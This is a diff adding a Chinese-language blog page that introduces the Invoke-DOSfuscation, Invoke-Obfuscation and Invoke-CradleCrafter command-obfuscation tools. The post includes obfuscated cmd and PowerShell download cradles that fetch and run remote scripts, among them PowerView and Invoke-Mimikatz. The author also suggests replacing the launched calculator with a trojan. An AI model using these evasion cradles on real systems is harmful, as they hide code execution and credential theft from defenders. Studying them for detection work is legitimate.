@@ -1,0 +1,695 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="写了放电脑上很久也没啥人可以交流，看到博客许久没更新东西了就随便找了篇贴上来其实也不是什么新东西，只是觉得非常有意思进行分享了下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dosfuscation、Obfuscation、CradleCrafter命令混淆生成器">
+<meta property="og:url" content="http://yoursite.com/2018/11/28/Dosfuscation、Obfuscation、CradleCrafter命令混淆生成器/index.html">
+<meta property="og:site_name" content="EvilAnne's Blog">
+<meta property="og:description" content="写了放电脑上很久也没啥人可以交流，看到博客许久没更新东西了就随便找了篇贴上来其实也不是什么新东西，只是觉得非常有意思进行分享了下。">
+<meta property="og:image" content="https://i.imgur.com/xvdtP52.jpg">
+<meta property="og:image" content="https://i.imgur.com/JRihvOh.jpg">
+<meta property="og:image" content="https://i.imgur.com/xAli4ok.jpg">
+<meta property="og:image" content="https://i.imgur.com/dcy6qJx.jpg">
+<meta property="og:image" content="https://i.imgur.com/cnlJVGy.jpg">
+<meta property="og:image" content="https://i.imgur.com/VtaODjb.jpg">
+<meta property="og:image" content="https://i.imgur.com/Pgw8p6p.jpg">
+<meta property="og:image" content="https://i.imgur.com/Sod8Fwd.jpg">
+<meta property="og:image" content="https://i.imgur.com/KD8izo9.jpg">
+<meta property="og:image" content="https://i.imgur.com/UEOS7DA.jpg">
+<meta property="og:image" content="https://i.imgur.com/jSLYliZ.jpg">
+<meta property="og:image" content="https://i.imgur.com/fC6zONY.jpg">
+<meta property="og:image" content="https://i.imgur.com/8tiP7l7.jpg">
+<meta property="og:image" content="https://i.imgur.com/5hvgrco.jpg">
+<meta property="og:image" content="https://i.imgur.com/BDOiqvU.jpg">
+<meta property="og:image" content="https://i.imgur.com/EmVCQFz.jpg">
+<meta property="og:updated_time" content="2018-11-28T23:34:25.595Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Dosfuscation、Obfuscation、CradleCrafter命令混淆生成器">
+<meta name="twitter:description" content="写了放电脑上很久也没啥人可以交流，看到博客许久没更新东西了就随便找了篇贴上来其实也不是什么新东西，只是觉得非常有意思进行分享了下。">
+<meta name="twitter:image" content="https://i.imgur.com/xvdtP52.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title> Dosfuscation、Obfuscation、CradleCrafter命令混淆生成器 | EvilAnne's Blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">EvilAnne's Blog</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Dosfuscation、Obfuscation、CradleCrafter命令混淆生成器
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2018-11-28T19:36:13+08:00" content="2018-11-28">
+              2018-11-28
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/网络安全/" itemprop="url" rel="index">
+                    <span itemprop="name">网络安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2018/11/28/Dosfuscation、Obfuscation、CradleCrafter命令混淆生成器/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2018/11/28/Dosfuscation、Obfuscation、CradleCrafter命令混淆生成器/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="https://i.imgur.com/xvdtP52.jpg" alt=""></p>
+<p>写了放电脑上很久也没啥人可以交流，看到博客许久没更新东西了就随便找了篇贴上来<br>其实也不是什么新东西，只是觉得非常有意思进行分享了下。</p>
+<a id="more"></a>
+<h3 id="Dosfuscation"><a href="#Dosfuscation" class="headerlink" title="Dosfuscation"></a>Dosfuscation</h3><p>Black Hat 2018年DOSfuscation演讲<br><code>https://www.youtube.com/watch?v=mej5L9PE1fs</code></p>
+<p><a href="https://github.com/danielbohannon/Invoke-DOSfuscation" target="_blank" rel="external">https://github.com/danielbohannon/Invoke-DOSfuscation</a><br><code>CMD命令混淆生成器</code></p>
+<p>2018年3月22日由FireEye发布了一份报告，关于<strong>DOSfuscation探索</strong>，可以花时间细读下，我读这份报告还有非常多的不懂也有很多的不明白。<br><code>https://www.fireeye.com/blog/threat-research/2018/03/dosfuscation-exploring-obfuscation-and-detection-techniques.html</code><br>在不断变化的防御环境中，熟练的攻击者不断寻找新的攻击技巧，同时采用逃避技术来保持旧技巧有效性。这些APT中的许多人使用混淆框架来处理常见的脚本语言，例如JavaScript和PowerShell，以阻止基于签名对这些语言编写的常见攻击性交易的检测。</p>
+<p>此工具在<code>Black Hat Asia 2018</code>上展示，研究人员通过9个月的时间去命令混淆的研究，能绕过当前的静态和动态检测方法。</p>
+<p>作者研究中灵感来源于各类APT攻击，首先是FIN8发布的一份钓鱼文件，FIN8是一名具有明显攻击性的钓鱼活动的金融威胁者。这个文档包含一个模糊的宏，它使用进程级环境变量和PowerShell的标准输入命令功能来隐藏所有有意义的命令行参数。通过使用PowerShell混淆来使Cobalt Strike Beacon后门下载器显得不容易被检测。（具体更详细看报告）</p>
+<p>攻击者使用<code>set</code>环境变量字符串，通过现有的环境变量中的字符串，进行替换提取来达到字符拼接，<br>如在<code>PowerShell</code>中替换字符串r<br><img src="https://i.imgur.com/JRihvOh.jpg" alt=""><br>从:开始取，取第4位中的一位就是r</p>
+<p><code>Powe%ALLUSERSPROFILE:~4,1%Shell.exe</code><br>同样达到运行PowerShell的结果<br><img src="https://i.imgur.com/xAli4ok.jpg" alt=""><br>这想法太棒了!</p>
+<p>除了通过<code>set</code>环境变量，还有<code>assoc</code>、<code>ftype</code>命令都被攻击者所使用。<br><code>assoc，显示或修改文件扩展名关联。如果在没有参数的情况下使用，则 assoc 将显示所有当前文件扩展名关联的列表。</code><br><img src="https://i.imgur.com/dcy6qJx.jpg" alt=""></p>
+<p><code>ftype Windows中的一个命令，用于显示或修改用在文件扩展名中的关联。</code></p>
+<p>作者通过分析别人APT攻击手法，最后构建了<code>Invoke-DOSfuscation</code>框架。<br>该框架的唯一目的是使防御者能够随机生成数千个独特的混淆样本命令，以针对这些技术测试和调整其检测能力。我在此版本中包含了我的完整测试工具，以自动执行此检测测试过程。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-DOSfuscation.psd1</span><br><span class="line">Invoke-DOSfuscation</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/cnlJVGy.jpg" alt=""></p>
+<p>混淆总共三个等级：<br>1.初级<br><code>cmd.exe /C&quot;set no= user&amp;&amp;set PdZG=net&amp;&amp;call set agHl=%PdZG%%no%&amp;&amp;call %agHl%&quot;</code><br><img src="https://i.imgur.com/VtaODjb.jpg" alt=""></p>
+<p>单从肉眼也不是那么容易看懂。</p>
+<p>中级<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CM^d; ; ;;/r  <span class="string">";;( (^Se^t ^ Vf^Zi= u^ser) )&amp;  (s^eT ^59j=ne^t)&amp; ;; cAL^l ;S^et   mSxd=%^59j%%Vf^Zi%&amp; ; ; ( ; ;  (CA^LL; ; %^mSxd%) ) "</span></span><br></pre></td></tr></table></figure></p>
+<p>高级<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^F^OR , /^F ; ; <span class="string">"delims=fSgk=  tokens= 2  "</span> ;; %^R ; ^iN ;;( ; <span class="string">' ; ; A^^ss^^Oc ,; .cmd'</span> , , ) ,,D^O ; %^R;  , x3 , , FyG9J7P0O/^c  <span class="string">" ; (  , , ,(^se^T _^*=e) ,  , ,  ,, )&amp;  (  , (^Se^t #^*^?]=^ )  , )&amp; (  ; ; (^sE^T -^#^'=^e),  )&amp;&amp;(, ,  , (^se^t ^~'^\&#123;=^t) )&amp;&amp; (^S^Et ^ ^ ^~&#123;=^r)&amp;&amp;  (^S^ET ^ [^`^#^@=n)&amp; (  (^Se^t ?^-^*'=^u) )&amp;&amp;( , (^Se^T ^ ^ ~^\=^s) ; ; )&amp;  ,; c^A^L^L ; ; s^e^t   .?=%[^`^#^@%%-^#^'%%^~'^\&#123;%%#^*^?]%%?^-^*'%%~^\%%_^*%%^~&#123;%&amp; , ; ( ; ;  (^c^aL^L ;; %^.?%) )"</span></span><br></pre></td></tr></table></figure></p>
+<p>ipconfig命令</p>
+<p><code>cmd /V:ON/C&quot;set pI=gifnocpi&amp;&amp;for /L %z in (7,-1,0)do set GI4S=!GI4S!!pI:~%z,1!&amp;&amp;if %z==0 call %GI4S:*GI4S!=%&quot;</code><br><img src="https://i.imgur.com/Pgw8p6p.jpg" alt=""></p>
+<p>更多的详细细节以及说明参考报告文档。</p>
+<h3 id="Obfuscation"><a href="#Obfuscation" class="headerlink" title="Obfuscation"></a>Obfuscation</h3><p>PowerShell混淆<br><a href="https://github.com/danielbohannon/Invoke-Obfuscation" target="_blank" rel="external">https://github.com/danielbohannon/Invoke-Obfuscation</a></p>
+<p>作者博客的两篇文章：<br><a href="http://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide" target="_blank" rel="external">http://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide</a><br><a href="http://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide-part-2" target="_blank" rel="external">http://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide-part-2</a></p>
+<p><code>SET SCRIPTPATH</code>还将接受PowerShell命令或脚本的URL<br><code>SET SCRIPTBLOCK</code> powershellstring</p>
+<p>正常PowerShell脚本，获取当前系统IP:<br><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1&#39;);Get-HostIP&quot;</code></p>
+<p>混淆过:<br><code>POWEr</code>S<code>hELl -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1&#39;);Get-HostIP&quot;</code></p>
+<p>再混淆:<br><code>&amp;(&#39;pow&#39;+&#39;ers&#39;+&#39;hell&#39;) -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1&#39;);Get-HostIP&quot;</code><br><img src="https://i.imgur.com/Sod8Fwd.jpg" alt=""><br><img src="https://i.imgur.com/KD8izo9.jpg" alt=""></p>
+<p><code>&amp;(&quot;{3}{1}{2}{0}&quot;-f&#39;hell&#39;,&#39;w&#39;,&#39;ers&#39;,&#39;po&#39;) -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1&#39;);Get-HostIP&quot;</code><br><img src="https://i.imgur.com/UEOS7DA.jpg" alt=""></p>
+<p><code>&amp;(&quot;{1}{2}{3}{0}&quot;-f&#39;ll&#39;,&#39;power&#39;,&#39;s&#39;,&#39;he&#39;) -nop -exec (&quot;{0}{1}&quot; -f&#39;bypa&#39;,&#39;ss&#39;) -c (((&quot;{13}{2}{14}{28}{6}{3}{15}{7}{16}{17}{4}{8}{12}{22}{21}{29}{20}{31}{27}{5}{0}{23}{1}{18}{33}{11}{10}{30}{9}{26}{25}{19}{24}{32}&quot;-f &#39;s&#39;,&#39;n&#39;,&#39;E&#39;,&#39;et.W&#39;,&#39;ownloa&#39;,&#39;ubu&#39;,&#39;N&#39;,&#39;ien&#39;,&#39;dS&#39;,&#39;s/ma&#39;,&#39;/Pow&#39;,&#39;heetz&#39;,&#39;tri&#39;,&#39;I&#39;,&#39;X &#39;,&#39;ebCl&#39;,&#39;t)&#39;,&#39;.D&#39;,&#39;tent.co&#39;,&#39;/PowerView&#39;,&#39;tps:/&#39;,&#39;(I3Lh&#39;,&#39;ng&#39;,&#39;erco&#39;,&#39;/&#39;,&#39;r&#39;,&#39;ste&#39;,&#39;th&#39;,&#39;(New-Object &#39;,&#39;t&#39;,&#39;erTool&#39;,&#39;/raw.gi&#39;,&#39;powerview.ps1I3L);Get-HostIP&#39;,&#39;m/c&#39;))  -rEPlacE ([CHAR]73+[CHAR]51+[CHAR]76),[CHAR]39)</code><br><img src="https://i.imgur.com/jSLYliZ.jpg" alt=""></p>
+<p>更多混淆：<br><code>&quot; $($OfS =&#39;&#39;)&quot;+ ([sTrInG][regEX]::MaTCHeS(&quot;))93]rahc[,)201]rahc[+96]rahc[+801]rahc[( EcaLPeRC-  63]rahc[,)96]rahc[+67]rahc[+84]rahc[(eCAlpeR- 43]rahc[,)99]rahc[+55]rahc[+101]rahc[( EcaLPeRC-)&#39;))93]RaH&#39;+&#39;c&#39;+&#39;[,43]RaHc[  f-  &#39;+&#39;))fElpofEl&#39;+&#39;,fElwar//&#39;+&#39;:spt&#39;+&#39;tfEl,fEllfEl,fEl/fEl,f&#39;+&#39;El&#39;+&#39;hf&#39;+&#39;El,fElrew&#39;+&#39;o&#39;+&#39;P&#39;+&#39;fEl,fE&#39;+&#39;l&#39;+&#39; &#39;+&#39;cexfEl,fEleW.fEl,fEle&#39;+&#39;tn&#39;+&#39;ocre&#39;+&#39;sufEl,fEloH-tfEl,fEl&#39;+&#39;efEl,fElsp.w&#39;+&#39;eivr&#39;+&#39;fEl,fEl}fEl,fElcejbfEl,&#39;+&#39;fEleh&#39;+&#39;sref&#39;+&#39;E&#39;+&#39;l,fEl&#39;+&#39;p/&#39;+&#39;fEl&#39;+&#39;,fEln&#39;+&#39;- &#39;+&#39;llfEl,fE&#39;+&#39;lew&#39;+&#39;ofE&#39;+&#39;l,fElt&#39;+&#39;Sd&#39;+&#39;ao&#39;+&#39;fEl,fEl&#39;+&#39;D.)t&#39;+&#39;neilCb&#39;+&#39;fE&#39;+&#39;l,fEl&#39;+&#39;N(&#39;+&#39; fEl,fElm/slooTfEl,fEl&#39;+&#39;}0{PItfEl,fElnwofEl,fEl&#39;+&#39;e- fEl,fEl&#39;+&#39;ztf&#39;+&#39;El,f&#39;+&#39;E&#39;+&#39;l&#39;+&#39;XEI}0{ c&#39;+&#39;- ss&#39;+&#39;afEl,fEl1{&#39;+&#39;(&#39;+&#39;g&#39;+&#39;nfEl,fEli&#39;+&#39;rfEl&#39;+&#39;,fElwo&#39;+&#39;pfEl,fElsfEl,&#39;+&#39;fElP&#39;+&#39;/refEl,fE&#39;+&#39;le&#39;+&#39;ehc/&#39;+&#39;moc.tn&#39;+&#39;f&#39;+&#39;El,fElt&#39;+&#39;s&#39;+&#39;afEl,fElbu&#39;+&#39;htig.fEl,fElO&#39;+&#39;-wefE&#39;+&#39;l,&#39;+&#39;fE&#39;+&#39;lpyb&#39;+&#39;fEl,fElt&#39;+&#39;eN tf&#39;+&#39;E&#39;+&#39;l,fElG;)}&#39;+&#39;1{1&#39;+&#39;fEl,f&#39;+&#39;E&#39;+&#39;lwei&#39;+&#39;Vrewof&#39;+&#39;El &#39;+&#39;f- c&#39;+&#39;7e}71{}9&#39;+&#39;{}03&#39;+&#39;{}92{}1&#39;+&#39;{}&#39;+&#39;82{}22{}42{}0{&#39;+&#39;}8&#39;+&#39;{}&#39;+&#39;6{}8&#39;+&#39;1{}&#39;+&#39;43&#39;+&#39;{}63{}41&#39;+&#39;{}7{&#39;+&#39;}13{}5{}83&#39;+&#39;{}5&#39;+&#39;3{}72{}21{}11&#39;+&#39;{}12{}73{}6&#39;+&#39;1{}02{}23{}&#39;+&#39;2{}6&#39;+&#39;2{}4{}&#39;+&#39;91{}31&#39;+&#39;{}&#39;+&#39;3{}33{}51{}93{}32&#39;+&#39;{}&#39;+&#39;52{}01&#39;+&#39;{c&#39;+&#39;7e&#39;+&#39;(&#39;+&#39;(( ( )fE&#39;+&#39;lfElnI&#39;+&#39;o&#39;+&#39;j-]52,62&#39;+&#39;,4[CE&#39;+&#39;psm&#39;+&#39;oc&#39;+&#39;:VneEL0 (. &#39;((()&#39;x&#39;+]31[Dillehs$+]1[dILlEhs$ (&amp;&quot; , &#39;.&#39;, &#39;RIGhTTOlEft&#39;) |foReaCh{ $_} )+&quot;$( SeT &#39;OfS&#39;  &#39; &#39;)&quot;|. ( $ENV:comsPeC[4,24,25]-jOiN&#39;&#39;)</code></p>
+<p>以及各类编码：<br><img src="https://i.imgur.com/fC6zONY.jpg" alt=""></p>
+<p>更多方式执行；<br><img src="https://i.imgur.com/8tiP7l7.jpg" alt=""></p>
+<p>以弹计算机，当然可以把计算器换成马<br><code>RuNDLl32.EXE  SHELL32.DLL ShellExec_RunDLL &quot;poweRsHELl&quot; &quot; -COMManD &quot;    &quot;C:\Windows\System32\calc.exe&quot;</code><br><img src="https://i.imgur.com/5hvgrco.jpg" alt=""></p>
+<h3 id="CradleCrafter"><a href="#CradleCrafter" class="headerlink" title="CradleCrafter"></a>CradleCrafter</h3><p><code>CradleCrafter</code>是混淆<code>PowerShell</code>执行下载脚本的混淆<br><code>https://github.com/danielbohannon/Invoke-CradleCrafter</code><br><code>http://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-cradlecrafter-overview</code><br><img src="https://i.imgur.com/BDOiqvU.jpg" alt=""></p>
+<p><code>Set-Variable yQ &#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;;SV 79r &#39;Net.WebClient&#39;;cd;SV 6wq (&amp;(Item Variable:\Ex*xt).Value.InvokeCommand.(((Item Variable:\Ex*xt).Value.InvokeCommand.PsObject.Methods|?{$_.Name-clike&#39;G*d&#39;}).Name).Invoke((Item Variable:\Ex*xt).Value.InvokeCommand.(((Item Variable:\Ex*xt).Value.InvokeCommand.PsObject.Methods|?{$_.Name-clike&#39;*om*e&#39;}).Name).Invoke(&#39;*w-*ct&#39;,$TRUE,$TRUE),[Management.Automation.CommandTypes]::Cmdlet)(Get-ChildItem Variable:79r).Value);Set-Item Variable:DqU ((((Get-ChildItem Variable:\6wq).Value|Member)|?{$_.Name-clike&#39;*wn*g&#39;}).Name);&amp;(COMMAND *e-*press*)((Get-ChildItem Variable:\6wq).Value.((Get-Variable DqU -Va)).Invoke((GI Variable:\yQ).Value));Invoke-Mimikatz</code><br><img src="https://i.imgur.com/EmVCQFz.jpg" alt=""></p>
+<p>获取当前IP:<br><code>SV dgy &#39;Net.WebClient&#39;;Set-Item Variable:\O1 &#39;https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1&#39;;gdr -*;Set-Variable 2 (&amp;(ChildItem Variable:/E*tex*).Value.InvokeCommand.(((ChildItem Variable:/E*tex*).Value.InvokeCommand|Member|Where-Object{(GI Variable:\_).Value.Name-ilike&#39;*t*a*d&#39;}).Name).Invoke((ChildItem Variable:/E*tex*).Value.InvokeCommand.(((ChildItem Variable:/E*tex*).Value.InvokeCommand.PsObject.Methods|Where-Object{(GI Variable:\_).Value.Name-ilike&#39;*nd*e&#39;}).Name).Invoke(&#39;Ne*ct&#39;,1,1),[System.Management.Automation.CommandTypes]::Cmdlet)(Get-ChildItem Variable:dgy).Value);SV PR ((((GV 2 -Va)|Member)|Where-Object{(GI Variable:\_).Value.Name-ilike&#39;D*a&#39;}).Name);.([String]::Join(&#39;&#39;,((ChildItem env:/C*S*c).Value[4,26,25])))([String]::Join(&#39;&#39;,(((GV 2 -Va).((GCI Variable:/PR).Value).Invoke((LS Variable:/O1).Value)|ForEach-Object{(DIR Variable:\_).Value-As&#39;Char&#39;}))));Get-HostIP</code></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/08/心情随笔八/" rel="next" title="心情随笔八">
+                <i class="fa fa-chevron-left"></i> 心情随笔八
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/29/2018-11月资源汇总/" rel="prev" title="2018-11月资源汇总">
+                2018-11月资源汇总 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2018/11/28/Dosfuscation、Obfuscation、CradleCrafter命令混淆生成器/"
+           data-title="Dosfuscation、Obfuscation、CradleCrafter命令混淆生成器" data-url="http://yoursite.com/2018/11/28/Dosfuscation、Obfuscation、CradleCrafter命令混淆生成器/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="EvilAnne" />
+          <p class="site-author-name" itemprop="name">EvilAnne</p>
+          <p class="site-description motion-element" itemprop="description">比天赋更重要的是变强起来的勇气</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">128</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Dosfuscation"><span class="nav-number">1.</span> <span class="nav-text">Dosfuscation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Obfuscation"><span class="nav-number">2.</span> <span class="nav-text">Obfuscation</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CradleCrafter"><span class="nav-number">3.</span> <span class="nav-text">CradleCrafter</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilAnne</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+  <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
